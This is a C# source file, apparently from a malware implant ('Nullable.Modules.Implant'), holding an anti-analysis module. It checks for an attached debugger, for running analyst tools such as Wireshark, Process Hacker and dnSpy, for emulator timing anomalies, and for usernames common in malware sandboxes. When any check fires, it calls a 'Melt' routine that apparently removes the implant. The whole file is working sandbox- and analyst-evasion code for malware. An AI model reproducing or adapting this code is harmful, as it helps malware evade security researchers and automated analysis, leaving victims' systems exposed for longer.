using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Runtime.InteropServices;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace Nullable.Modules.Implant
{
    internal sealed class Analysis
    {
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        private static extern bool CheckRemoteDebuggerPresent(IntPtr hProcess, ref bool isDebuggerPresent);

        public static bool Debugger()
        {
            bool isDebuggerPresent = false;
            try
            {
                CheckRemoteDebuggerPresent(Process.GetCurrentProcess().Handle, ref isDebuggerPresent);
                return isDebuggerPresent;
            }
            catch
            { 
            }
            return isDebuggerPresent;
        }

        public static bool Processes()
        {
            var runningProcessList = Process.GetProcesses();
            string[] selectedProcessList =
            {
                "processhacker",
                "netstat", "netmon", "tcpview", "wireshark",
                "filemon", "regmon", "cain", "DnSpy"
            };
            return runningProcessList.Any(process => selectedProcessList.Contains(process.ProcessName.ToLower()));
        }

        public static bool Emulator()
        {
            try
            {
                var ticks = DateTime.Now.Ticks;
                Thread.Sleep(10);
                if (DateTime.Now.Ticks - ticks < 10L)
                    return true;
            }
            catch
            {
            }

            return false;
        } 

        public static bool User()
        {
            bool status = false;
            string[] Usernames =
            {
                "Maltest",
                "Virus",
                "John Scott",
                "e",
                "Locky",
                "Malware",
                "Saferwall",
                "Timmy",
                "Sandbox",
                "Paul Jones",
                "Emily",
                "test",
                "IT-ADMIN",
                "Malware",
                "malware",
                "maltest",
                "JonahF"
            };

            string User = Environment.UserName;

            foreach(string x in Usernames)
            {
                if (User == x)
                {
                    status = true;
                }
            }

            return status;
        }

        public static bool Check()
        {
            bool status = false;
            if (Config.AntiAnalysis != "1") return status;
            if (Debugger()) status = true;
            if (Emulator()) status = true;
            if (Processes()) status = true;
            if (User()) status = true;

            if (status == true)
            {
                Melt.Activate();
            }
            return status;
        }
    }
}
